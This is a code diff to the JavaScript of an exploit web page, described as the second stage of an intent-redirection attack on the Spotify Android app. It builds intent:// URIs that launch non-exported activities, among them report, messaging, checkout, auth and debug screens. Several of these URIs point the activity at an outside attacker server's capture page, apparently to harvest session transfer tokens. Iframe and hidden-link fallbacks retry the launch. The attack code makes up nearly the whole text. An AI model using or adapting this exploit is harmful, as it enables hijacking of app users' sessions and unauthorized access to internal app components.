@@ -41,57 +41,134 @@
     // STAGE 2: Second-level Intent Redirection
     //
     // This page is loaded inside InAppBrowserActivity's WebView.
-    // It triggers an intent:// URI that launches ReportWebViewActivity
-    // (a non-exported component) with an attacker-controlled URL.
+    //
+    // URL parameters control behavior:
+    //   ?mode=launcher  → Navigate to launcher.html (interactive menu of all non-exported activities)
+    //   ?mode=auto      → Auto-launch ReportWebViewActivity (default, original chain)
+    //   ?target=<id>    → Launch a specific activity from the launcher list
     //
     // The intent:// handler in InAppBrowserActivity (ivy.c() via mqp0.j())
     // parses the URI via Intent.parseUri() and launches it with
     // startActivity() - NO VALIDATION is performed on the target.
     // =============================================================
 
-    // CHANGE THIS to your actual attacker server
     var ATTACKER_SERVER = "https://folklorxdnelsaka.github.io/idkwebview";
+    var PKG = "com.spotify.music";
 
-    // Target: ReportWebViewActivity (non-exported)
-    // This activity reads "report_webview_url" from extras and loads it
-    // in a y111 WebView, triggering getSessionTransferToken() API call
-    var REPORT_ACTIVITY = "com.spotify.reporting.reportaction.ReportWebViewActivity";
+    // Parse URL params
+    var params = new URLSearchParams(window.location.search);
+    var mode = params.get('mode') || 'auto';
+    var target = params.get('target');
 
-    // Construct the intent:// URI
-    // Format: intent://<data>#Intent;<params>;end
-    // S.<key>=<value> sets String extras
-    var intentUri = "intent://report#Intent;"
-        + "component=com.spotify.music/" + REPORT_ACTIVITY + ";"
-        + "S.report_webview_url=" + encodeURIComponent(ATTACKER_SERVER + "/capture.html") + ";"
-        + "end";
+    // Activity definitions for targeted launches
+    var targets = {
+        report: {
+            name: "ReportWebViewActivity",
+            uri: "intent://report#Intent;"
+                + "component=" + PKG + "/com.spotify.reporting.reportaction.ReportWebViewActivity;"
+                + "S.report_webview_url=" + encodeURIComponent(ATTACKER_SERVER + "/capture.html") + ";"
+                + "end"
+        },
+        messaging: {
+            name: "MessagingUtilsInternalWebviewActivity",
+            uri: "intent://messaging#Intent;"
+                + "component=" + PKG + "/com.spotify.messaging.messagingutils.MessagingUtilsInternalWebviewActivity;"
+                + "S.inapp_internalwebview_uri=" + encodeURIComponent(ATTACKER_SERVER + "/capture.html") + ";"
+                + "end"
+        },
+        paml: {
+            name: "PremiumAccountManagementWebviewActivity",
+            uri: "intent://paml#Intent;"
+                + "component=" + PKG + "/com.spotify.premiumaccountmanagement.management.page.PremiumAccountManagementWebviewActivity;"
+                + "S.inapp_internalwebview_uri=" + encodeURIComponent(ATTACKER_SERVER + "/capture.html") + ";"
+                + "end"
+        },
+        checkout: {
+            name: "PremiumCheckoutActivity",
+            uri: "intent://checkout#Intent;"
+                + "component=" + PKG + "/com.spotify.checkout.premiumcheckout.PremiumCheckoutActivity;"
+                + "end"
+        },
+        auth: {
+            name: "AuthorizationActivityInternalProxy",
+            uri: "intent://auth#Intent;"
+                + "component=" + PKG + "/com.spotify.appauthorization.sso.internalauth.AuthorizationActivityInternalProxy;"
+                + "S.client_id=exploit_test;"
+                + "S.redirect_uri=" + encodeURIComponent(ATTACKER_SERVER + "/capture.html") + ";"
+                + "S.response_type=code;"
+                + "end"
+        },
+        debug: {
+            name: "RemoteConfigurationDebugActivity",
+            uri: "intent://debug#Intent;"
+                + "component=" + PKG + "/com.spotify.remoteconfig.debugfeature.RemoteConfigurationDebugActivity;"
+                + "end"
+        },
+        google: {
+            name: "GoogleCheckoutActivity",
+            uri: "intent://checkout#Intent;"
+                + "component=" + PKG + "/com.spotify.gpb.googlecheckout.GoogleCheckoutActivity;"
+                + "end"
+        },
+        spotifycheckout: {
+            name: "SpotifyCheckoutActivity",
+            uri: "intent://checkout#Intent;"
+                + "component=" + PKG + "/com.spotify.checkout.spotifycheckout.SpotifyCheckoutActivity;"
+                + "end"
+        }
+    };
 
-    // Small delay to ensure page is fully loaded and WebViewClient is ready
-    setTimeout(function() {
-        document.getElementById('status').textContent = 'Redirecting...';
+    function navigate(uri, name) {
+        document.getElementById('status').textContent = 'Launching ' + (name || 'target') + '...';
 
-        // Navigate to the intent:// URI
-        // This triggers: shouldOverrideUrlLoading -> mqp0.j() -> ivy.c()
-        // -> Intent.parseUri() -> startActivity()
-        window.location.href = intentUri;
-    }, 500);
+        // Method 1: window.location.href
+        setTimeout(function() {
+            window.location.href = uri;
+        }, 500);
 
-    // Fallback: if intent:// doesn't work via location, try other methods
-    setTimeout(function() {
-        // Method 2: iframe-based navigation
-        var iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = intentUri;
-        document.body.appendChild(iframe);
-    }, 2000);
+        // Method 2: iframe fallback
+        setTimeout(function() {
+            var iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = uri;
+            document.body.appendChild(iframe);
+        }, 2000);
 
-    // Method 3: anchor click
-    setTimeout(function() {
-        var a = document.createElement('a');
-        a.href = intentUri;
-        a.style.display = 'none';
-        document.body.appendChild(a);
-        a.click();
-    }, 3500);
+        // Method 3: anchor click fallback
+        setTimeout(function() {
+            var a = document.createElement('a');
+            a.href = uri;
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            a.click();
+        }, 3500);
+    }
+
+    // =========================================================
+    // Mode selection
+    // =========================================================
+
+    if (mode === 'launcher') {
+        // Redirect to the full interactive launcher page
+        document.getElementById('status').textContent = 'Loading launcher...';
+        setTimeout(function() {
+            window.location.href = ATTACKER_SERVER + '/launcher.html';
+        }, 300);
+
+    } else if (target && targets[target]) {
+        // Launch a specific activity
+        var t = targets[target];
+        navigate(t.uri, t.name);
+
+    } else {
+        // Default: Auto-launch ReportWebViewActivity (original attack chain)
+        var defaultUri = "intent://report#Intent;"
+            + "component=" + PKG + "/com.spotify.reporting.reportaction.ReportWebViewActivity;"
+            + "S.report_webview_url=" + encodeURIComponent(ATTACKER_SERVER + "/capture.html") + ";"
+            + "end";
+
+        navigate(defaultUri, "ReportWebViewActivity");
+    }
     </script>
 </body>
 </html>
